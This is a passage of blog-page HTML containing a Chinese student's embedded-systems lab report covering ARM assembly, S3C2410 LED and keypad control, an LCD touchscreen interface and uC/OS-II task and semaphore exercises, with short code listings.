title=\"（2）实验内容\"></a>（2）实验内容</h3><ul>\n<li>熟悉开发环境的使用并使用 ldr/str，mov 等指令访问寄存器或存储单元;</li>\n<li>学习使用 add/sub/lsl/lsr/and/orr 等指令，完成基本算术/逻辑运算;</li>\n<li>设计实现表达式y=a*8+b/2-c，并验证之;</li>\n<li>完成分支程序设计，要求判断参数，根据不同参数，调用不同的子程序。</li>\n</ul>\n<h3 id=\"（3）实验原理\"><a href=\"#（3）实验原理\" class=\"headerlink\" title=\"（3）实验原理\"></a>（3）实验原理</h3><ul>\n<li>ARM9 处理器内核共有 37 个寄存器：</li>\n<li>31 个通用寄存器，包括程序计数器(PC)。这些寄存器都是 32 位的;</li>\n<li>6 个状态寄存器。这些寄存器也是32 位的，但是只是使用了其中的12 位。</li>\n</ul>\n<p><img src=\"clip_image008.jpg\" alt=\"1\"></p>\n<p>大端格式：字数据的高位字节存储在低地址中，而字数据的低位字节则存放在高地址中。</p>\n<p><img src=\"clip_image010.jpg\" alt=\"img\"></p>\n<p>小端格式：字数据的高位字节存储在高地址中，而字数据的低位字节则存放在低地址中。</p>\n<p><img src=\"clip_image012.jpg\" alt=\"img\"></p>\n<p>ENTRY：设置程序默认入口点，一个程序可有多个 ENTRY，但一个源文件最多只有一个。</p>\n<p>EQU 伪操用于将数字常量、基于寄存器的值和程序中的标号定义为一个字符名称。</p>\n<p>IMPORT (EXTERN 功能完全相同)用于声明在其他模块中定义但需要在本文件中使用的符号。</p>\n<p>EXPORT（GLOBAL 功能完全相同）用于声明在本文件中定义但能在其他模块中使用的变量，相当于定义了一个全局变量。</p>\n<p>AREA 用于定义一个代码段或数据段，ARM 汇编程序设计采用分段式设计，一个 ARM 源程序至少有一个代码段，大的程序会有若干个代码段和数据段。</p>\n<p>语法格式：AREA segment-name, class-name, attributes ,…</p>\n<h3 id=\"（4）实验步骤\"><a href=\"#（4）实验步骤\" class=\"headerlink\" title=\"（4）实验步骤\"></a>（4）实验步骤</h3><h4 id=\"1-4-1验证示例源码\"><a href=\"#1-4-1验证示例源码\" class=\"headerlink\" title=\"1.4.1验证示例源码\"></a>1.4.1验证示例源码</h4><ol>\n<li>拷贝整个实验例程源码目录到本地磁盘自己的工作目录下;</li>\n<li>使用μVision IDE for ARM 通过ULINK2仿真器连接实验板，打开实验例程目录ARM体系\\1.1_asm1子目录下的asm_1a.Uv2 例程，编译链接工程;</li>\n<li>该工程配置为在模拟器中运行，可调试程序，观察结果;</li>\n<li>验证实验例程目录ARM体系\\1.2_asm2子目录下的asm2.Uv2 例程。</li>\n</ol>\n<h4 id=\"1-4-2设计实现自己的汇编程序\"><a href=\"#1-4-2设计实现自己的汇编程序\" class=\"headerlink\" title=\"1.4.2设计实现自己的汇编程序\"></a>1.4.2设计实现自己的汇编程序</h4><ol>\n<li>拷贝示例实验源码工程;</li>\n<li>编辑汇编源程序;</li>\n<li>设计实现表达式y=a*8+b/2-c，并验证之;</li>\n<li>设计利用函数跳转表实现子程序调用，并验证之。</li>\n</ol>\n<h3 id=\"（5）实验结果\"><a href=\"#（5）实验结果\" class=\"headerlink\" title=\"（5）实验结果\"></a>（5）实验结果</h3><h4 id=\"1-5-1已验证示例程序\"><a href=\"#1-5-1已验证示例程序\" class=\"headerlink\" title=\"1.5.1已验证示例程序\"></a>1.5.1已验证示例程序</h4><h4 id=\"1-5-2\"><a href=\"#1-5-2\" class=\"headerlink\" title=\"1.5.2\"></a>1.5.2</h4><p><img src=\"clip_image014.jpg\" alt=\"img\"></p>\n<h3 id=\"（6）程序说明\"><a href=\"#（6）程序说明\" class=\"headerlink\" title=\"（6）程序说明\"></a>（6）程序说明</h3><p>设计实现表达式y=a*8+b/2-c，并验证之</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov r0, #_a         ;r0=1</span><br><span class=\"line\">LSL ro, #3          ;r0=r0*8</span><br><span class=\"line\">mov r1, #_b         ;r1=2</span><br><span class=\"line\">LSR r1, #1          ;r1=r1/2</span><br><span class=\"line\">add r0, r0, r1        ;r0=r0+R1</span><br><span class=\"line\">sub r0, r0, #_c       ;R0=R0-3</span><br></pre></td></tr></table></figure>\n\n<p>设计利用函数跳转表实现子程序调用，并验证之</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">AREA  Jump，CODE，READONLY \t\t;设置本段程序的</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t;名称（Jump）及属性</span><br><span class=\"line\">num\tEQU  2 \t\t\t\t\t\t\t;跳转表中的子程序个数</span><br><span class=\"line\">\t\tENTRY        \t\t\t\t;程序执行的入口点</span><br><span class=\"line\">Start</span><br><span class=\"line\">\t\tMOV   r0，#0 \t\t\t\t;设置3个参数，然后调用子程序\t\t\t\t\t\t\t\t\t\t;arithfunc，进行算术运算</span><br><span class=\"line\">\t\tMOV   r1，#3 </span><br><span class=\"line\">\t\tMOV   r2，#2</span><br><span class=\"line\">\t\tBL    arithfunc  \t\t\t\t;调用子程序arithfunc</span><br><span class=\"line\">Stop\t\t\t\t\t\t\t\t\t;程序退出</span><br><span class=\"line\">\t\tMOV  r0， #0x18</span><br><span class=\"line\">\t\tLDR  r1，=0x20026</span><br><span class=\"line\">\t\tSWI  0x123456</span><br><span class=\"line\">Arithfunc\t\t\t  \t\t\t\t\t;子程序arithfunc入口点</span><br><span class=\"line\">\t\tCMP   \tr0，#num      \t  \t;判断选择子程序的参数是否在</span><br><span class=\"line\">\t\t\t\t\t  \t\t\t\t ;有效范围之内</span><br><span class=\"line\">\t\tMOVHS \tpc，lr   \t  \t\t;若不在，则直接返回</span><br><span class=\"line\">\t\tADR\t\tr3，JumpTable    \t;读取跳转表的基地址（ADR是伪指令）</span><br><span class=\"line\">\t\tLDR\t\tpc，[r3，r0，LSL #2] \t;根据参数r0的值跳转到</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t ;相应的子程序</span><br><span class=\"line\">JumpTable</span><br><span class=\"line\">\t\tDCD\t\tDoAdd</span><br><span class=\"line\">\t\tDCD\t\tDoSub</span><br><span class=\"line\">DoAdd    \t\t\t\t\t\t\t;子程序DoAdd执行加法操作</span><br><span class=\"line\"> \t\tADD\tr0，r1，r2</span><br><span class=\"line\"> \t\tMOV\tpc，lr</span><br><span class=\"line\">DoSub \t\t\t\t\t\t\t\t;子程序DoSub执行减法操作</span><br><span class=\"line\"> \t\tSUB\tr0，r1，r2</span><br><span class=\"line\">\t\tMOV\tpc，lr</span><br><span class=\"line\">\t\tEND           \t\t\t\t;结束汇编</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"（7）总结\"><a href=\"#（7）总结\" class=\"headerlink\" title=\"（7）总结\"></a>（7）总结</h3><p>以前学过8086汇编，ARM汇编与之相比更加灵活和实用（例如更多寄存器的使用等），函数跳转表实现了更加方便的函数管理。在ARM汇编时也要更加注意应该遵守的编写规则。</p>\n<h2 id=\"2．S3C2410基本接口实验\"><a href=\"#2．S3C2410基本接口实验\" class=\"headerlink\" title=\"2．S3C2410基本接口实验\"></a>2．S3C2410基本接口实验</h2><h3 id=\"（1）实验目的-1\"><a href=\"#（1）实验目的-1\" class=\"headerlink\" title=\"（1）实验目的\"></a>（1）实验目的</h3><ul>\n<li>掌握S3C2410X 芯片的I/O 控制寄存器的配置;</li>\n<li>通过实验掌握ARM 芯片使用I/O 口控制LED 显示;</li>\n<li>了解ARM 芯片中复用I/O 口的使用方法;</li>\n<li>通过实验掌握键盘控制与设计方法。</li>\n<li>熟练编写 ARM 核处理器S3C2410X 中断处理程序。</li>\n</ul>\n<h3 id=\"（2）实验内容-1\"><a href=\"#（2）实验内容-1\" class=\"headerlink\" title=\"（2）实验内容\"></a>（2）实验内容</h3><ul>\n<li>编写程序，控制实验平台的发光二极管LED1、LED2、LED3、LED4，使它们有规律的点亮和熄灭;</li>\n<li>使用实验板上 5x4 用户键盘，编写程序接收键盘中断;</li>\n<li>使用键盘控制发光二极管，按照不同模式点亮。</li>\n</ul>\n<h3 id=\"（3）实验原理-1\"><a href=\"#（3）实验原理-1\" class=\"headerlink\" title=\"（3）实验原理\"></a>（3）实验原理</h3><p>S3C2410X 芯片上共有 71 个多功能的输入输出管脚，他们分为 7 组 I/O 端口。</p>\n<ul>\n<li>一个 23 位的输出端口（端口 A）;</li>\n<li>两个 11 位的输入/输出端口（端口 B、H）;</li>\n<li>四个 16 位的输入/输出端口（端口 C、D、E、G）;</li>\n<li>一个 8 位的输入/输出端口（端口 F）;</li>\n</ul>\n<p>可以很容易的每组端口来满足不同系统配置和设计的需要。在运行程序之前必须对每个用到的管脚功能进行设置，如果某些管脚的复用功能没有使用，可以先将该管脚设置为 I/O 口。</p>\n<p><img src=\"clip_image016.jpg\" alt=\"1\"></p>\n<p>实验原理图</p>\n<p><img src=\"clip_image018.jpg\" alt=\"2\"></p>\n<p>键盘连接电路</p>\n<p><img src=\"clip_image020.jpg\" alt=\"1\"></p>\n<p>键盘控制电路</p>\n<h3 id=\"（4）实验步骤-1\"><a href=\"#（4）实验步骤-1\" class=\"headerlink\" title=\"（4）实验步骤\"></a>（4）实验步骤</h3><h4 id=\"2-4-1验证示例源码\"><a href=\"#2-4-1验证示例源码\" class=\"headerlink\" title=\"2.4.1验证示例源码\"></a>2.4.1验证示例源码</h4><ol>\n<li>拷贝整个实验例程源码目录到本地磁盘自己的工作目录下;</li>\n<li>使用μVision IDE for ARM 通过ULINK2仿真器连接实验板，打开实验例程目录02_led_test 子目录下的led_test. Uv2 例程，编译链接工程;</li>\n<li>调试程序，观察运行结果;</li>\n<li>打开实验例程目录12_KeyBoardTest子目录下的KeyBoardTest.Uv2 例程，编译链接工程</li>\n<li>调试程序，观察运行结果。</li>\n</ol>\n<h4 id=\"2-4-2设计实现自己的I-O控制程序\"><a href=\"#2-4-2设计实现自己的I-O控制程序\" class=\"headerlink\" title=\"2.4.2设计实现自己的I/O控制程序\"></a>2.4.2设计实现自己的I/O控制程序</h4><ol>\n<li>拷贝示例实验源码工程;</li>\n<li>设计程序，实现使用键盘控制发光二极管按照不同模式点亮。</li>\n</ol>\n<h3 id=\"（5）实验结果-1\"><a href=\"#（5）实验结果-1\" class=\"headerlink\" title=\"（5）实验结果\"></a>（5）实验结果</h3><p><img src=\"clip_image022.png\" alt=\"img\"></p>\n<p> <img src=\"clip_image024.jpg\" alt=\"img\"></p>\n<h3 id=\"（6）程序说明-1\"><a href=\"#（6）程序说明-1\" class=\"headerlink\" title=\"（6）程序说明\"></a>（6）程序说明</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">yigedeng</span><span class=\"params\">()</span>\t\t\t\t\t\t<span class=\"comment\">//亮一个灯的程序块</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,nOut;\t\t\t\t\t\t<span class=\"comment\">//定义i为和亮灯持续时间的变量</span></span><br><span class=\"line\">\tnOut = <span class=\"number\">0x0780</span>;\t\t\t\t\t<span class=\"comment\">//定义nOut为和具体亮灯情况有关的变量</span></span><br><span class=\"line\">\trGPBDAT=nOut &amp; <span class=\"number\">0x0700</span>;\t\t\t<span class=\"comment\">//取和运算之后，亮一个灯</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">100000</span>;i++);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">lianggedeng</span><span class=\"params\">()</span>\t\t\t\t\t<span class=\"comment\">//亮两个灯的程序块</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,nOut;</span><br><span class=\"line\">\tnOut = <span class=\"number\">0x0780</span>;</span><br><span class=\"line\">\trGPBDAT=nOut &amp; <span class=\"number\">0x0600</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">100000</span>;i++);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">sangedeng</span><span class=\"params\">()</span>\t\t\t\t\t<span class=\"comment\">//亮三个灯的程序块</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,nOut;</span><br><span class=\"line\">\tnOut = <span class=\"number\">0x0780</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\trGPBDAT=nOut &amp; <span class=\"number\">0x0400</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">100000</span>;i++);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">sigedeng</span><span class=\"params\">()</span>\t\t\t\t\t\t<span class=\"comment\">//亮四个灯的程序块</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,nOut;</span><br><span class=\"line\">\tnOut = <span class=\"number\">0x0780</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\trGPBDAT=nOut &amp; <span class=\"number\">0x0000</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">100000</span>;i++);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">shan</span><span class=\"params\">()</span>\t\t\t\t\t\t\t<span class=\"comment\">//四个灯同时闪烁</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;\t</span><br><span class=\"line\">\trGPBDAT=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">100000</span>;i++);</span><br><span class=\"line\">\trGPBDAT=<span class=\"number\">0x0780</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">100000</span>;i++);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">UINT8T <span class=\"title\">key_set</span><span class=\"params\">(UINT8T ucChar)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(ucChar)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:yigedeng();<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:lianggedeng();<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:sangedeng();<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:sigedeng();<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">5</span>:shan();<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\tucChar-=<span class=\"number\">1</span>; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">9</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">10</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">11</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">12</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">13</span>:</span><br><span class=\"line\">\t\t\t\tucChar-=<span class=\"number\">4</span>; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">17</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">18</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">19</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">20</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">21</span>:</span><br><span class=\"line\">\t\t\t\t\tucChar-=<span class=\"number\">7</span>; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">25</span>: ucChar = <span class=\"number\">0xF</span>; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">26</span>: ucChar = <span class=\"string\">'+'</span>; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">27</span>: ucChar = <span class=\"string\">'-'</span>; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">28</span>: ucChar = <span class=\"string\">'*'</span>; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">29</span>: ucChar = <span class=\"number\">0xFF</span>; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>: ucChar = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ucChar;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"（7）总结-1\"><a href=\"#（7）总结-1\" class=\"headerlink\" title=\"（7）总结\"></a>（7）总结</h3><p>通过对变量的异或操作，实现对灯亮与灭的控制。我认为，控制每个按键对应灯的情况，主要在最后的switch-case语句，根据每次出发的case不同来执行不同的函数（每个函数内部实现亮灭和时间长度的控制），而想要使亮灭的模式增多，就要在各个函数内部实现rGPBDAT这个变量取值的多样性。 </p>\n<h2 id=\"3．人机接口实验\"><a href=\"#3．人机接口实验\" class=\"headerlink\" title=\"3．人机接口实验\"></a>3．人机接口实验</h2><h3 id=\"（1）实验目的-2\"><a href=\"#（1）实验目的-2\" class=\"headerlink\" title=\"（1）实验目的\"></a>（1）实验目的</h3><ul>\n<li>掌握液晶屏的使用及其电路设计方法;</li>\n<li>掌握S3C2410X 处理器的LCD 控制器的使用;</li>\n<li>通过实验掌握液晶显示文本及图形的方法与程序设计;</li>\n<li>通过实验掌握触摸屏（TSP）的设计与控制方法。</li>\n</ul>\n<h3 id=\"（2）实验内容-2\"><a href=\"#（2）实验内容-2\" class=\"headerlink\" title=\"（2）实验内容\"></a>（2）实验内容</h3><ul>\n<li>掌握液晶屏作为人机接口界面的设计方法，并编写程序实现;</li>\n<li>编程实现触摸屏坐标转换为液晶对应坐标;</li>\n<li>编程实现由液晶屏和触摸屏构成的可以互动的人机界面，至少实现3屏。</li>\n</ul>\n<h3 id=\"（3）实验原理-2\"><a href=\"#（3）实验原理-2\" class=\"headerlink\" title=\"（3）实验原理\"></a>（3）实验原理</h3><p>液晶屏（LCD：Liquid Crystal Display）主要用于显示文本及图形信息。液晶显</p>\n<p>示屏具有轻薄、体积小、低耗电量、无辐射危险、平面直角显示以及影像稳定不闪</p>\n<p>烁等特点，因此在许多电子应用系统中，常使用液晶屏作为人机界面。</p>\n<p><img src=\"clip_image026.png\" alt=\"img\"></p>\n<p>LCD 控制器框图</p>\n<p><img src=\"clip_image028.png\" alt=\"img\"></p>\n<p>象素在内存中的表示</p>\n<p><img src=\"clip_image030.png\" alt=\"img\"></p>\n<p>16 位TFT表示RGB示意图</p>\n<p><img src=\"clip_image032.png\" alt=\"img\"></p>\n<p>象素点的RGB示意图</p>\n<p>显存位置<strong>：</strong>#define LCDFRAMEBUFFER 0x31000000</p>\n<p>显存位于内存起始地址（0x3000 0000 ）偏移16M（0x0100 0000）的地方。</p>\n<p>显存的大小：320×240×2 = 153600字节</p>\n<p><img src=\"clip_image034.jpg\" alt=\"img\"></p>\n<p>触摸屏等效电路</p>\n<h3 id=\"（4）实验步骤-2\"><a href=\"#（4）实验步骤-2\" class=\"headerlink\" title=\"（4）实验步骤\"></a>（4）实验步骤</h3><h4 id=\"3-4-1验证示例源码\"><a href=\"#3-4-1验证示例源码\" class=\"headerlink\" title=\"3.4.1验证示例源码\"></a>3.4.1<strong>验证示例源码</strong></h4><ol>\n<li>拷贝整个实验例程源码目录到本地磁盘自己的工作目录下;</li>\n<li>使用μVision IDE for ARM 通过ULINK2仿真器连接实验板，打开实验例程目录11_LCD_Test 子目录下的LCD_Test.Uv2例程，编译链接工程;</li>\n<li>调试程序，观察运行结果;</li>\n<li>打开实验例程目录07_TSP_Test子目录下的TSP_Test.Uv2例程，编译链接工程;</li>\n<li>调试程序，观察运行结果。</li>\n</ol>\n<h4 id=\"3-4-2设计实现自己的人机互动界面程序\"><a href=\"#3-4-2设计实现自己的人机互动界面程序\" class=\"headerlink\" title=\"3.4.2设计实现自己的人机互动界面程序\"></a>3.4.2设计实现自己的人机互动界面程序</h4><ol>\n<li>拷贝示例实验源码工程;</li>\n<li>设计程序实现由液晶屏和触摸屏构成的可互动的人机界面，至少实现3屏。</li>\n</ol>\n<h3 id=\"（5）实验结果-2\"><a href=\"#（5）实验结果-2\" class=\"headerlink\" title=\"（5）实验结果\"></a>（5）实验结果</h3><h4 id=\"3-5-1已验证示例程序\"><a href=\"#3-5-1已验证示例程序\" class=\"headerlink\" title=\"3.5.1已验证示例程序\"></a>3.5.1已验证示例程序</h4><h4 id=\"3-5-2\"><a href=\"#3-5-2\" class=\"headerlink\" title=\"3.5.2\"></a>3.5.2</h4><p><img src=\"clip_image036.jpg\" alt=\"img\"></p>\n<p><img src=\"clip_image038.jpg\" alt=\"img\"></p>\n<p><img src=\"clip_image040.jpg\" alt=\"img\"></p>\n<p><img src=\"clip_image042.png\" alt=\"img\"></p>\n<p><img src=\"clip_image044.png\" alt=\"img\"></p>\n<h3 id=\"（6）程序说明-2\"><a href=\"#（6）程序说明-2\" class=\"headerlink\" title=\"（6）程序说明\"></a>（6）程序说明</h3><p>将tsp_test相关的程序文件以及依赖转入color_lcd_test的工程文件中并解决依赖关系。主要程序变动在color_lcd_test.c最后的for循环和复制过来的void __irq tsp_int(void)程序中。</p>\n<ol>\n<li>将最后的for循环注释掉，只留一个tsp_test()，用于触摸屏幕时触发void tsp_test(void)函数以及void irq tsp_int(void)函数。</li>\n<li>增加全局变量int nummun=0，int nummun_1;在void irq tsp_int(void)函数中对int nummun进行加1和模3运算，再根据nummun_1决定LCD变成哪种颜色。</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nummun+=1;</span><br><span class=\"line\">nummun_1 = nummun%3;</span><br><span class=\"line\">if (nummun_1 == 0) Lcd_Clear(0x800);</span><br><span class=\"line\">if (nummun_1 == 1) Lcd_Clear(0x7e0);</span><br><span class=\"line\">if (nummun_1 == 2) Lcd_Clear(0x1f);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"（7）总结-2\"><a href=\"#（7）总结-2\" class=\"headerlink\" title=\"（7）总结\"></a>（7）总结</h3><p>本实验对我来说是难度相比来说最大的一个，尤其是需要解决以下两个问题：</p>\n<ol>\n<li>将两个项目的源码整合到一起并且解决依赖关系和库文件导入的问题。LCD_color_test的依赖关系复杂，将它移到tsp_test里比较困难（实施后发现问题太多，放弃此方案）;反过来后比较简单地解决了问题。</li>\n<li>每次点击屏幕才会触发tsp的中断。刚开始我一直无法将tsp的程序段停下来，导致LCD屏幕一直在更换颜色，而我每次点击屏幕只是极短地延缓更换的时间;后我将更换颜色的程序块放入tsp的程序块内，创建全局变量每次加一，对此全局变量的拷贝进行取模运算达到循环更换颜色的结果。</li>\n</ol>\n<p>解决了以上两个问题，即成功实现人机交互—点击屏幕更换颜色。</p>\n<h2 id=\"4、μC-OS-II系统原理实验\"><a href=\"#4、μC-OS-II系统原理实验\" class=\"headerlink\" title=\"4、μC/OS-II系统原理实验\"></a>4、μC/OS-II系统原理实验</h2><h3 id=\"（1）实验目的-3\"><a href=\"#（1）实验目的-3\" class=\"headerlink\" title=\"（1）实验目的\"></a>（1）实验目的</h3><ul>\n<li>理解任务管理的基本原理，了解任务的各个基本状态及其变迁过程;</li>\n<li>掌握µCOS-II中任务管理的基本方法;</li>\n<li>创建、启动、挂起、解挂任务</li>\n<li>掌握µCOS-II中任务使用信号量的一般原理</li>\n</ul>\n<h3 id=\"（2）实验内容-3\"><a href=\"#（2）实验内容-3\" class=\"headerlink\" title=\"（2）实验内容\"></a>（2）实验内容</h3><ul>\n<li>设计多个应用任务，验证任务管理函数;</li>\n<li>通过实现“哲学家就餐”问题，验证信号量对任务间互斥访问的支持;</li>\n<li>应用信号量实现任务间的同步，设计7个任务，并顺序执行</li>\n</ul>\n<h3 id=\"（3）实验原理：\"><a href=\"#（3）实验原理：\" class=\"headerlink\" title=\"（3）实验原理：\"></a>（3）实验原理：</h3><p>建立两个任务 Task1 和 Task2：任务 Task1 不断地挂起自己，再被任务 Task2 解挂，两个任务不断地切换执行。并在串口打印相应的信息。用户可以通过串口进行观察。</p>\n<p>一个任务通常是一个无限的循环 ，由于任务的执行是由操作系统内核调度的，</p>\n<p>因此任务是绝不会返回的，其返回参数必须定义成 void。在 μC/OS-Ⅱ中，当一个运行着的任务使一个比它优先级高的任务进入了就绪态，当前任务的 CPU 使用权就会被抢占，高优先级任务会立刻得到 CPU 的控制权（在系统允许调度和任务切换的前提下）。μC/OS-Ⅱ可以管理多达 64 个任务，但目前版本的 μC/OS-Ⅱ有两个任务已经被系统占用了（即空闲任务和统计任务）。必须给每个任务赋以不同的优先级 ， 任 务 的 优 先 级 号 就 是 任 务 编 号 （ ID ）， 优 先 级 可 以 从 0 到OS_LOWEST_PRIORITY。优先级号越低，任务的优先级越高。μC/OS-Ⅱ总是运行进入就绪态的优先级最高的任务。</p>\n<p><img src=\"clip_image046.png\" alt=\"img\"></p>\n<p><img src=\"clip_image048.jpg\" alt=\"img\"></p>\n<h3 id=\"（4）实验步骤：\"><a href=\"#（4）实验步骤：\" class=\"headerlink\" title=\"（4）实验步骤：\"></a>（4）实验步骤：</h3><h4 id=\"4-4-1验证示例源码\"><a href=\"#4-4-1验证示例源码\" class=\"headerlink\" title=\"4.4.1验证示例源码\"></a>4.4.1验证示例源码</h4><ol>\n<li>拷贝整个实验例程源码目录到本地磁盘自己的工作目录下;</li>\n<li>使用μVision IDE for ARM 通过ULINK2仿真器连接实验板，打开实验例程目录04-uCOS\\2.1_Task_test 子目录下的ucos2.Uv2例程，编译链接工程;</li>\n<li>将程序下载到实验平台的 NorFlash 中，观察串口输出;</li>\n<li>打开实验例程目录\\04-uCOS\\2.3_Semaphore_test子目录下的ucos2.Uv2例程，编译链接工程;</li>\n<li>下载调试，观察结果。</li>\n</ol>\n<h4 id=\"4-4-2设计实现一个多任务应用程序\"><a href=\"#4-4-2设计实现一个多任务应用程序\" class=\"headerlink\" title=\"4.4.2设计实现一个多任务应用程序\"></a>4.4.2设计实现一个多任务应用程序</h4><ol>\n<li>拷贝示例实验源码工程;</li>\n<li>设计7个任务，并用信号量实现7个任务顺序执行，将执行结果在串口上打印出来。</li>\n</ol>\n<h3 id=\"（5）实验结果：\"><a href=\"#（5）实验结果：\" class=\"headerlink\" title=\"（5）实验结果：\"></a>（5）实验结果：</h3><h4 id=\"4-5-1已验证示例程序\"><a href=\"#4-5-1已验证示例程序\" class=\"headerlink\" title=\"4.5.1已验证示例程序\"></a>4.5.1已验证示例程序</h4><h4 id=\"4-5-2\"><a href=\"#4-5-2\" class=\"headerlink\" title=\"4.5.2\"></a>4.5.2</h4><p><img src=\"clip_image050.jpg\" alt=\"img\"></p>\n<p><img src=\"clip_image052.png\" alt=\"img\"></p>\n<h3 id=\"（6）程序说明-3\"><a href=\"#（6）程序说明-3\" class=\"headerlink\" title=\"（6）程序说明\"></a>（6）程序说明</h3><p>添加以下代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">OS_EVENT *sem6;</span><br><span class=\"line\">OS_EVENT *sem7;</span><br><span class=\"line\"></span><br><span class=\"line\">OS_STK TestTask6Stk[TaskStkLeath];</span><br><span class=\"line\">OS_STK TestTask7Stk[TaskStkLeath];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">Global <span class=\"keyword\">void</span> <span class=\"title\">Task6</span><span class=\"params\">(<span class=\"keyword\">void</span> *pdata)</span></span>;</span><br><span class=\"line\"><span class=\"function\">Global <span class=\"keyword\">void</span> <span class=\"title\">Task7</span><span class=\"params\">(<span class=\"keyword\">void</span> *pdata)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">sem6 = OSSemCreate(<span class=\"number\">1</span>);</span><br><span class=\"line\">sem7 = OSSemCreate(<span class=\"number\">1</span>);</span><br><span class=\"line\">OSTaskCreate(Task6,(<span class=\"keyword\">void</span> *)<span class=\"number\">6</span>,&amp;TestTask6Stk[TaskStkLeath<span class=\"number\">-1</span>],<span class=\"number\">10</span>);</span><br><span class=\"line\">OSTaskCreate(Task7,(<span class=\"keyword\">void</span> *)<span class=\"number\">7</span>,&amp;TestTask7Stk[TaskStkLeath<span class=\"number\">-1</span>],<span class=\"number\">11</span>);</span><br></pre></td></tr></table></figure>\n\n<p>每个task调整OSTimeDly()和OSTaskCreate中的最后一个值有10倍关系，调整OSSemPost()为模7后相邻的两位哲学家，例如第1为哲学家设置OSSemPost(sem1);OSSemPost(sem7);</p>\n<h3 id=\"（7）总结-3\"><a 